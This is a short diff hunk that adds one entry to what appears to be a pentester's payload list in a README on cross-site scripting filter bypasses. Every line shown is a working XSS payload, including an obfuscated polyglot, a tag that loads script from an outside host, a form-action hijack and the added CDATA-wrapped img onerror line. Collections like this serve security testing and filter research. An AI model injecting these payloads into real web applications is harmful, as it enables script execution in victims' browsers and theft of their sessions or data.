@@ -231,6 +231,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   "%20onmouseenter=confirm(document.domain)%20value="
   '"onclick=(co\u006efirm)?.0><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)1"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert2>%22%3E%3CSvg/onload=confirm3//<Script/src=//ChiragXSS.xSs.ht></scripT>
   "><svg onload=document.forms[1].action='http://localhost/?Hacked'>
+  ">&lt;<![\CDATA[<]]>img src=x onerror=prompt(document.domain)&gt;
   ```
 </details>
 
